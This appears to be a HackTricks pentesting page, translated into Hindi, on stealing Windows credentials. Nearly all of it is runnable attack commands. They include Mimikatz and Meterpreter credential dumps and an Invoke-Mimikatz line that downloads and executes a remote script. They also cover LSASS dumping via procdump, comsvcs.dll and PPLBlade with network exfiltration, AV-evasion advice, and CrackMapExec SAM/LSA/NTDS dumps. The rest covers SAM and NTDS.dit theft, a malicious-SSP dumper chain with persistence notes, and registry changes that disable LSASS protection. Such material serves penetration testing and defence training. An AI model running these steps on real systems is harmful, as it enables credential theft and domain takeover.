# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz और क्या कर सकता है इसमें** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials निकालने से रोक सकते हैं।**

## Credentials के साथ Meterpreter

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का उपयोग करें **जो** मैंने बनाया है ताकि victim के अंदर **passwords और hashes खोजे जा सकें**।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

चूंकि **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, इसे Defender द्वारा पता नहीं लगाया जाता।\
आप इस टूल का उपयोग करके **dump the lsass process**, **download the dump** और **extract** कर सकते हैं तथा dump से **credentials locally** निकाल सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** **procdump.exe to dump lsass.exe** के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, यह इसलिए है क्योंकि वे स्ट्रिंग **"procdump.exe" and "lsass.exe"** को **detect** कर रहे होते हैं। इसलिए procdump को lsass.exe के नाम के **instead of** lsass.exe का **PID** एक **argument** के रूप में **pass** करना अधिक **stealthier** होगा।

### lsass को **comsvcs.dll** से dump करना

`C:\Windows\System32` में स्थित **comsvcs.dll** नामक एक DLL crash की स्थिति में **dumping process memory** के लिए जिम्मेदार है। यह DLL **`MiniDumpW`** नामक एक **function** रखती है, जिसे `rundll32.exe` के माध्यम से invoke करने के लिए डिजाइन किया गया है。\
पहले दो arguments का उपयोग अप्रासंगिक है, पर तीसरा argument तीन घटकों में विभक्त होता है। जिसे dump किया जाना है उस प्रक्रिया का ID पहला घटक होता है, dump फ़ाइल का स्थान दूसरा घटक होता है, और तीसरा घटक सख्ती से शब्द **full** होता है। कोई वैकल्पिक विकल्प मौजूद नहीं है।\
इन तीन घटकों को पार्स करने के बाद, DLL dump फ़ाइल बनाना शुरू करती है और निर्दिष्ट प्रक्रिया की मेमोरी को इस फ़ाइल में स्थानांतरित कर देती है।\
**comsvcs.dll** का उपयोग lsass प्रोसेस को dump करने के लिए संभव है, जिससे procdump को अपलोड और execute करने की आवश्यकता समाप्त हो जाती है। इस विधि का विस्तृत वर्णन [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) पर दिया गया है।

निम्नलिखित कमांड निष्पादन के लिए उपयोग की जाती है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को [**lssasy**](https://github.com/Hackndo/lsassy) के साथ स्वचालित कर सकते हैं।**

### **lsass को Task Manager से डंप करना**

1. Task Bar पर राइट क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes tab में "Local Security Authority Process" प्रोसेस को खोजें
4. "Local Security Authority Process" प्रोसेस पर राइट क्लिक करें और "Create dump file" पर क्लिक करें।

### lsass को procdump से डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा साइन किया गया एक बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## lsass को PPLBlade के साथ डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो memory dump को obfuscate करने और इसे disk पर drop किए बिना remote workstations पर transfer करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को बायपास करना
2. memory dump files को obfuscate करके Defender के signature-based detection mechanisms से बचना
3. memory dump को RAW और SMB upload methods का उपयोग करके disk पर drop किए बिना upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-आधारित LSASS dumping बिना MiniDumpWriteDump के

Ink Dragon एक तीन-स्टेज dumper भेजता है जिसे **LalsDumper** कहा जाता है जो कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर EDR hooks कभी ट्रिगर नहीं होते:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 lower-case `d` characters वाला placeholder खोजता है, उसे `rtu.txt` के absolute path से ओवरराइट करता है, patched DLL को `nfdp.dll` के रूप में सेव करता है, और `AddSecurityPackageA("nfdp","fdp")` कॉल करता है। यह **LSASS** को malicious DLL को नए Security Support Provider (SSP) के रूप में load करने के लिए मजबूर करता है।
2. **Stage 2 inside LSASS** – जब LSASS `nfdp.dll` load करता है, DLL `rtu.txt` पढ़ता है, हर byte को `0x20` से XOR करता है, और decoded blob को memory में map करके execution ट्रांसफर करता है।
3. **Stage 3 dumper** – mapped payload MiniDump logic को re-implement करता है using **direct syscalls** जो hashed API names से resolve होते हैं (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). एक dedicated export नाम `Tom` `%TEMP%\<pid>.ddt` खोलता है, compressed LSASS dump को file में stream करता है, और handle बंद कर देता है ताकि बाद में exfiltration हो सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को उसी directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने से chain टूट जाती है।
* Registration `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में append करके होता है। आप उस value को खुद seed कर सकते हैं ताकि LSASS हर boot पर SSP को reload करे।
* `%TEMP%\*.ddt` files compressed dumps हैं। लोकली decompress करें, फिर credential extraction के लिए उन्हें Mimikatz/Volatility में feed करें।
* `lals.exe` चलाने के लिए admin/SeTcb rights चाहिए ताकि `AddSecurityPackageA` सफल हो; एक बार कॉल रिटर्न करने के बाद LSASS transparently rogue SSP को load कर लेता है और Stage 2 execute करता है।
* DLL को disk से हटाने से वह LSASS से evict नहीं होती। या तो registry entry को delete करें और LSASS restart करें (reboot) या उसे long-term persistence के लिए छोड़ दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA गुप्त जानकारी निकालें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit को Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump NTDS.dit की password history को target DC से
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet attribute दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फाइलें **स्थित** होनी चाहिए _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_. लेकिन **आप उन्हें सामान्य तरीके से बस कॉपी नहीं कर सकते** क्योंकि वे संरक्षित हैं।

### रजिस्ट्री से

उन फाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से उनकी एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
उन फाइलों को अपनी Kali मशीन पर **डाउनलोड करें** और **extract the hashes** करने के लिए निम्न का उपयोग करें:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके सुरक्षित फाइलों की कॉपी कर सकते हैं। आपको Administrator होना चाहिए।

#### vssadmin का उपयोग

vssadmin बाइनरी केवल Windows Server संस्करणों में उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप वही **Powershell** से भी कर सकते हैं। यह एक उदाहरण है कि **SAM file को कैसे कॉपी करें** (हार्ड ड्राइव जिसका उपयोग "C:" है और इसे C:\users\Public में सेव किया गया है) लेकिन आप इसे किसी भी सुरक्षित फ़ाइल की कॉपी के लिए उपयोग कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक कॉपी बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** फाइल को **Active Directory** का दिल माना जाता है, यह user objects, groups और उनकी memberships के बारे में महत्वपूर्ण डेटा रखती है। यही वह जगह है जहाँ domain users के **password hashes** स्टोर होते हैं। यह फाइल एक **Extensible Storage Engine (ESE)** डेटाबेस है और यह **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित रहती है।

इस डेटाबेस के भीतर तीन मुख्य तालिकाएँ रखी जाती हैं:

- **Data Table**: यह तालिका users और groups जैसे objects के बारे में विवरण स्टोर करने का काम करती है।
- **Link Table**: यह सम्बन्धों को ट्रैक करती है, जैसे group memberships।
- **SD Table**: हर object के **Security descriptors** यहाँ रखे जाते हैं, जो स्टोर किए गए objects के लिए security और access control सुनिश्चित करते हैं।

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows उस फाइल के साथ इंटरैक्ट करने के लिए _Ntdsa.dll_ का उपयोग करता है और यह _lsass.exe_ द्वारा उपयोग किया जाता है। फिर, **NTDS.dit** फाइल का एक **part** संभवतः **`lsass`** मेमोरी के अंदर स्थित हो सकता है (आप हाल ही में एक्सेस किया गया डेटा पा सकते हैं, संभवतः प्रदर्शन में सुधार के लिए **cache** का उपयोग करने के कारण)।

#### Decrypting the hashes inside NTDS.dit

Hash को 3 बार सिफर/डिक्रिप्ट किया जाता है:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. PEK का उपयोग करके और **RC4** से हैश को डिक्रिप्ट करें।
3. हैश को **DES** का उपयोग करके डिक्रिप्ट करें।

**PEK** का मान हर **domain controller** में एक समान होता है, लेकिन इसे **NTDS.dit** फाइल के अंदर उस **domain controller** की **SYSTEM** फाइल के **BOOTKEY** का उपयोग करके सिफर किया जाता है (यह domain controllers के बीच अलग होता है)। इसलिए NTDS.dit फाइल से क्रेडेंशियल्स प्राप्त करने के लिए आपको फाइलें **NTDS.dit** और **SYSTEM** चाहिए (_C:\Windows\System32\config\SYSTEM_)।

### Copying NTDS.dit using Ntdsutil

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**volume shadow copy**](#stealing-sam-and-system) trick का उपयोग करके **ntds.dit** फ़ाइल की एक प्रति भी कॉपी कर सकते हैं। ध्यान रखें कि आपको **SYSTEM file** की भी एक प्रति चाहिए होगी (फिर से, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit से hashes निकालना**

एक बार जब आपके पास **प्राप्त** की हुई **NTDS.dit** और **SYSTEM** फ़ाइलें हों, तो आप _secretsdump.py_ जैसे टूल का उपयोग करके **hashes निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक वैध domain admin user का उपयोग करके उन्हें **स्वचालित रूप से निकाल भी सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
बड़ी **NTDS.dit फ़ाइलों** के लिए, इन्हें निकालने के लिए [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करने की सिफारिश की जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में निकालना**

NTDS objects को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ एक SQLite database में निकाला जा सकता है। सिर्फ secrets ही नहीं निकाले जाते, बल्कि पूरे objects और उनके attributes भी निकाले जाते हैं ताकि raw NTDS.dit फ़ाइल मिलने के बाद आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive वैकल्पिक है लेकिन secrets को डिक्रिप्ट करने की अनुमति देता है (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories). अन्य जानकारी के साथ, निम्नलिखित डेटा निकाला जाता है : user और machine accounts उनके hashes के साथ, UAC flags, last logon और password change के timestamp, accounts का description, names, UPN, SPN, groups और recursive memberships, organizational units का tree और membership, trusted domains उनके trusts के type, direction और attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). आप इस बाइनरी का उपयोग कई software से credentials निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के अन्य टूल

### Windows credentials Editor (WCE)

यह टूल मेमोरी से credentials निकालने के लिए इस्तेमाल किया जा सकता है। डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से credentials निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **इसे execute करें** और पासवर्ड निकाल दिए जाएंगे.

## निष्क्रिय RDP सत्रों का खनन और सुरक्षा नियंत्रणों को कमजोर करना

Ink Dragon के FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी तकनीकें किसी भी red-teamer के लिए उपयोगी हैं:

### DumpRDPHistory-शैली का टेलीमेट्री संग्रह

* **Outbound RDP targets** – प्रत्येक user hive को `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर पार्स करें। प्रत्येक subkey में server name, `UsernameHint`, और last write timestamp संग्रहित रहता है। आप PowerShell से FinalDraft की लॉजिक को नकल कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (successful logon) और **25** (disconnect) के लिए क्वेरी करें ताकि यह मैप किया जा सके कि किसने बॉक्स का प्रशासन किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

एक बार जब आप जान लें कि कौन सा Domain Admin नियमित रूप से कनेक्ट होता है, तो उनके **disconnected** session अभी मौजूद रहने पर LSASS को dump करें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें बाद में SMB/WinRM के माध्यम से replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence stage की जा सकती है।

### FinalDraft द्वारा लक्षित Registry डाउनग्रेड्स
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* सेटिंग `DisableRestrictedAdmin=1` RDP के दौरान credential/ticket के पूर्ण पुन: उपयोग को मजबूर करती है, जिससे pass-the-hash style pivots सक्षम होते हैं.
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को अक्षम कर देता है ताकि local admins को नेटवर्क पर unrestricted tokens मिलें.
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC ऑनलाइन होते समय लॉग ऑन करने की अनुमति देता है, और हमलावरों को एक और built-in high-privilege account दे देता है.
* `RunAsPPL=0` LSASS PPL protections को हटा देता है, जिससे dumpers जैसे LalsDumper के लिए memory access आसान हो जाता है.

## संदर्भ

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
